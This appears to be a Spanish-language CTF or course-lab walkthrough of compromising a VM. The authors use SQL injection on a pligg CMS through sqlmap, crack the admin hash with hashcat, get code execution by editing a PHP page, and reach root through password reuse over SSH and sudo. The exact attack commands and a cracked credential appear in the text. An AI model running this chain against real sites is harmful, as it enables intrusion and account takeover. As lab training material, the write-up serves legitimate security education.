# Ejercicio 2

Una vez montada la VM, lo primero que hicimos fue correr `nmap` para ver con que puertos podiamos trabajar. Las respuestas a estos comandos se encuentran en la carpeta `nmap`.

De aqui podemos ver que tenemos 4 puertos disponibles en la VM:

- Un servidor ftp en el puerto 21
- Un servidor ssh en el puerto 22
- Un servidor http en el puerto 80 y 8000

Mas aun, el servidor en el puerto 80 parece tener varias cosas dentro, asi que decidimos mirar ese primero

Tenemos 3 cosas para mirar, `nasa`, `pligg` y `important`

En este momento tiramos 3 scannings con `nikto` para ver si descubriamos algo en `/`, `/pligg` o `/nasa`. Los logs se encuentran en la carpeta `nikto_logs`

Lo que podemos ver es que `nikto` cree que `/` es vulnerable a path-traversal, pero en realidad siempre se devuelve el contenido de `/`

Por otra parte, en `nasa`, `nikto` encontro varios directorios que parecieran venir por default en `wordpress`. Pensamos que `/nasa/wp-content/uploads/` nos llevaria a algo, pero no. Solamente tiene algunos archivos sin tanta importancia. No obstante, no me parece bueno que se pueda acceder a esas uploads en caso de que puedan contener informacion sensitiva.

El mas interesante es `pligg`, encontramos varios directorios y archivos, ademas de un `.gitignore`. De todas maneras esto no nos llevo a nada, pero es la pagina con la que mas podemos interactuar despues de todo.

Despues de jugar un poco con la pagina, tocar los links, encontrar un user `barack`, etc. vimos que `pligg` es una tecnologia en si (CMS). 

Nunca escuchamos hablar de tal, asi que me imaginamos que, o era viejo, o era poco popular, asi que ahi fuimos a `exploit-db` a ver si aparecia algo

Efectivamente
```
https://www.exploit-db.com/exploits/38577
```
nos explica que pligg en la version <= 2.0.2 es vulnerable a SQL injection, por varias vias

La verdad no sabiamos la version del pligg de la VM, pero no se perdia nada en probar

Lo pusimos directamente en `sqlmap` haciendo

```
sqlmap -u "http://172.18.1.68/pligg/story.php?title=secret-war&reply=1&comment_id=1" --dbs
```

y como consecuencia tenemos las bases de datos

```
[*] base_de_pepe
[*] information_schema
```

y las tablas

```
+-----------------------------+
| pligg_additional_categories |
| pligg_categories            |
| pligg_comments              |
| pligg_config                |
| pligg_formulas              |
| pligg_friends               |
| pligg_group_member          |
| pligg_group_shared          |
| pligg_groups                |
| pligg_links                 |
| pligg_login_attempts        |
| pligg_messages              |
| pligg_misc_data             |
| pligg_modules               |
| pligg_old_urls              |
| pligg_redirects             |
| pligg_saved_links           |
| pligg_tag_cache             |
| pligg_tags                  |
| pligg_totals                |
| pligg_trackbacks            |
| pligg_users                 |
| pligg_votes                 |
| pligg_widgets               |
+-----------------------------+
```

y al usuario `barack`
```
email:hash:role
bobama@nsa.gov.us:1bf490bb34c2383ac91e67505741b9cdad3b9bee87e62ba98:admin
```

Al parecer es el admin de la pagina, junto con el hecho de haber encontrado esto
```
https://github.com/jenaye/pligg
```
Nos da una clara via para conseguir RCE si logramos crackear el hash.

Despues de mucho investigar, el hash tiene el siguiente tipo (primero 9 caracteres forman la salt):
```
SHA1(salt.hash)
4c2383ac91e67505741b9cdad3b9bee87e62ba98:1bf490bb3
```
Esto fue verificado ya que me cree un usuario mio con la password `asdasd`, consegui el hash, y me auto crackie

Estaba dificil de todas maneras crackear el hash, pero con el *hint* pudimos lograrlo corriendo:

```
hashcat -m 120 hashes/barack 100k-most-used-passwords-NCSC.txt -r .hcmask
```

Password is `obamaobamaobama`!!

Una vez hecho esto, ya podia causar RCE. Lo que hice fue simplemente cambiar la pagina de `error_404.php` para que me corriera un comando (el codigo que mande puede verse en el archivo `error_404.php`). Jugando un poco pude leer los usuarios, de los cuales me llamaron la atencion 2 `obama` y `michelle`.

En ese momento probe usar la password en SSH, que habiamos visto antes que estaba abierto, y efectivamente, el muchacho `obama` reutilizo su password para acceder por SSH.

Una vez adentro, vemos que `obama` puede correr cualquier cosa si usa `sudo`

Habra reutilizado `obama` una vez mas su password para `sudo`? Indeed... \*facepalm\*
```
sudo -i
```
Este es el contenido de `flag.txt`

```
 _________________________________________
/ Congratulations, you win the Soft.      \
| Aplicativo's contest... The secret      |
| token is:                               |
| 7091996b0ccbb6c6145dca439f44cbe3c6c757e |
\ 476241d1cc64ec3dcf0f722fb               /
 -----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

Las vulnerabilidades de `pligg` no fueron resueltas por los fabricantes, asi que no tiene solucion. Esto ya nos asegura podes spawnear un `shell` con el usuario `www-data` en la VM (se que es `www-data` porque lo probe).

Si `obama` fuera mas precavido y no reusara sus passwords, tendriamos que ver como escalar privilegios con ese usuario.